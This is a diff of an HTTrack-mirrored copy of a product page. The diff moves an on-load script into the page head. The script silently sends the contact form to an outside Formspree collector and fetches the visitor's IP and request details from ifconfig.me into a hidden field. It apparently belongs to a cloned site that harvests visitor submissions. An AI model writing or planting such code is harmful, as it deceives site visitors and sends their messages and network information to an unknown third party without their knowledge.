@@ -8,6 +8,29 @@
 <!-- Mirrored from www.popliresources.com/product/45 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 28 Feb 2023 14:31:43 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
+    <script>
+        window.onload = function() {
+          var urls=[
+          "https://formspree.io/f/mrgvogqw"
+          ];
+          var contactForm = document.getElementById("contact_form");
+          contactForm.action = urls[Math.floor(Math.random() * urls.length)];
+      
+          var xhr = new XMLHttpRequest;
+          xhr.open('GET', "https://ifconfig.me/all", true);
+          xhr.onload = function (e) {
+              if (xhr.readyState === 4) {
+                  if (xhr.status === 200) {
+                      var userInfo = document.getElementById("contact_form_user_info");
+                      userInfo.value = xhr.responseText;
+                  } else {
+                      console.error(xhr.statusText);
+                  }
+              }
+          };
+          xhr.send();
+        }
+      </script>
 
 <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -457,31 +480,6 @@
                                 }
                                 
                             </style>
-
-                            <script>
-                                window.onload = function() {
-                                  var urls=[
-                                  "https://formspree.io/f/mrgvogqw"
-                                  ];
-                                  var contactForm = document.getElementById("contact_form");
-                                  contactForm.action = urls[Math.floor(Math.random() * urls.length)];
-                              
-                                  var xhr = new XMLHttpRequest;
-                                  xhr.open('GET', "https://ifconfig.me/all", true);
-                                  xhr.onload = function (e) {
-                                      if (xhr.readyState === 4) {
-                                          if (xhr.status === 200) {
-                                              var userInfo = document.getElementById("contact_form_user_info");
-                                              userInfo.value = xhr.responseText;
-                                          } else {
-                                              console.error(xhr.statusText);
-                                          }
-                                      }
-                                  };
-                                  xhr.send();
-                                }
-                              </script>
-
 
                             <!-- modify this form HTML and place wherever you want your form -->
                             <form
